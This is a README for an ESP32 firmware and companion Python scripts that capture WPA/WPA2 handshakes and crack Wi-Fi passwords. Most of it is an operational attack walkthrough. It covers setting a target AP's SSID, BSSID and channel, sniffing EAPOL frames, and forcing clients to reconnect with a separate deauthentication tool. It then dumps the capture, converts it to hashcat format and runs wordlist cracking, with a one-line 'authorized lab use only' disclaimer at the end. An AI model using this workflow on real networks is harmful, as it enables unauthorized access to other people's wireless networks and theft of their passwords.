# WPA Handshake Capture — Sniffer & Cracker (ESP32 + Python)

Educational WPA/WPA2 4-way handshake capture tool. The ESP32 sniffs EAPOL key frames in promiscuous mode, saves the handshake to SPIFFS, and companion Python scripts extract and crack the password.

**Serial CLI only** — no OLED, no buttons, no hardware peripherals needed.

## How It Works

### On the ESP32

1. **Promiscuous mode** — Captures all 802.11 frames on the configured channel
2. **EAPOL detection** — Filters for EtherType `0x888E` (EAPOL over LAN)
3. **Message classification** — Parses Key Information flags to detect M1/M2/M3/M4:
   ```
   M1: key_ack=1, key_mic=0, secure=0
   M2: key_ack=0, key_mic=1, secure=0
   M3: key_ack=1, key_mic=1, secure=1
   M4: key_ack=0, key_mic=1, secure=1
   ```
4. **Storage** — Stores ANonce, SNonce, MICs, and raw EAPOL frames. M1+M2 = complete handshake
5. **SPIFFS persistence** — Saves/loads captures to `/handshake.bin`

### On the Host (Python tools in `tools/`)

| Script | Purpose |
|--------|---------|
| `capture_handshake.py` | Fetches binary dump from ESP32 over serial |
| `convert_handshake.py` | Converts to hashcat mode 22000 format |
| `crack_handshake.py` | Pure-Python WPA cracker (PBKDF2-SHA1, PRF-512, HMAC-SHA1) |
| `find_ap_info.sh` | Bash script to discover AP info from Linux host |

Wordlists: `tools/wordlists/tiny.txt`, `common.txt`, `lab.txt`

## Commands

```
  set_ssid <name>                  Target AP SSID
  set_bssid <AA:BB:CC:DD:EE:FF>   Target AP BSSID
  set_channel <1-14>               WiFi channel to sniff
  start                            Begin promiscuous sniffing
  stop                             Stop sniffing
  status                           Show M1/M2/M3/M4 flags, EAPOL count
  save / load                      Handshake to/from SPIFFS + config to/from NVS
  dump / dump_raw                  Human-readable / machine-parseable hex dump
  reset                            Clear captured handshake
```

## Typical Workflow

```bash
# 1. On laptop, find target AP info
./tools/find_ap_info.sh

# 2. On ESP32 serial console
set_ssid MyNetwork
set_bssid AA:BB:CC:DD:EE:FF
set_channel 6
start
# Wait for "[HS] *** COMPLETE HANDSHAKE ***"
save

# 3. On laptop, extract and crack
python3 tools/capture_handshake.py /dev/ttyUSB0
python3 tools/convert_handshake.py files/handshake.bin
python3 tools/crack_handshake.py
# Or: hashcat -m 22000 files/handshake.bin.22000 wordlist.txt
```

## Performing the Capture

### Step 1 — Find the target AP

On the laptop, run the helper script while connected to the target:

```bash
./tools/find_ap_info.sh
```

Output:
```
SSID:       MyNetwork
BSSID:      46:5C:B8:8B:E3:61
Channel:    6
```

Alternatively, use the separate **Deauthentication** project's scanner firmware.

### Step 2 — Configure the ESP32 via serial

Connect via serial monitor (115200 baud) and configure:

```
set_ssid MyNetwork
set_bssid 46:5C:B8:8B:E3:61
set_channel 6
```

### Step 3 — Start sniffing

```
start
```

The ESP32 enters promiscuous mode on channel 6 and waits for EAPOL frames.

### Step 4 — Trigger a handshake

Have a client connect to the target AP (or reconnect if already connected). The serial output shows:

```
[HS] M1/4 captured  BSSID: 46:5C:B8:8B:E3:61  STA: E0:D4:64:C2:C5:54
[HS] M2/4 captured  BSSID: 46:5C:B8:8B:E3:61  STA: E0:D4:64:C2:C5:54
[HS] *** COMPLETE HANDSHAKE (M1+M2) ***
```

If no client reconnects naturally, use the separate **Deauthentication** project to force a disconnect — the client will immediately reconnect, generating a fresh handshake.

### Step 5 — Save and verify

```
save
status
```

Check that M1 and M2 show "YES".

### Step 6 — Dump to laptop

```
dump_raw
```

On the laptop, capture the output:

```bash
python3 tools/capture_handshake.py /dev/ttyUSB0
```

### Step 7 — Convert to hashcat format

```bash
python3 tools/convert_handshake.py files/handshake.bin
```

Output: `files/handshake.bin.22000`

### Step 8 — Crack the password

```bash
python3 tools/crack_handshake.py
```

This runs hashcat or the built-in pure-Python cracker using the wordlists in `tools/wordlists/`. If the password is in the wordlist, you get:

```
RESULT: Password cracked successfully!
```

Or with hashcat directly:

```bash
hashcat -m 22000 files/handshake.bin.22000 tools/wordlists/common.txt
```

## Handshake Binary Format (SPIFFS `/handshake.bin`)

```
[Magic: "WPA1" (4 bytes)]
[BSSID (6 bytes)]
[STA MAC (6 bytes)]
[SSID length (1 byte)]
[SSID (32 bytes, zero-padded)]
[ANonce (32 bytes)]
[SNonce (32 bytes)]
[MIC M2 (16 bytes)]
[MIC M3 (16 bytes)]
[M1 length (2 bytes)]
[M2 length (2 bytes)]
[M3 length (2 bytes)]
[M4 length (2 bytes)]
[M1 data (variable)]
[M2 data (variable)]
[M3 data (variable)]
[M4 data (variable)]
```

Total size: ~300-500 bytes per handshake.

## Build

```bash
cd "Network Attacks/WPA Handshake Capture"
pio run
pio run --target upload
```

Requires SPIFFS partition (configured in `platformio.ini`: `board_build.filesystem = spiffs`).

## Limitations

| Limitation | Reason |
|------------|--------|
| **2.4 GHz only** | ESP32 radio hardware |
| **No true monitor mode** | Cannot capture corrupted/invalid FCS frames |
| **Single channel** | Must know target channel in advance |
| **No deauth injection** | This firmware captures passively — actively force reconnection with the separate Deauthentication project |
| **SPIFFS reliability** | Risk of corruption on power loss during write |

> **Authorized lab use only.** Do not use on networks you do not own.
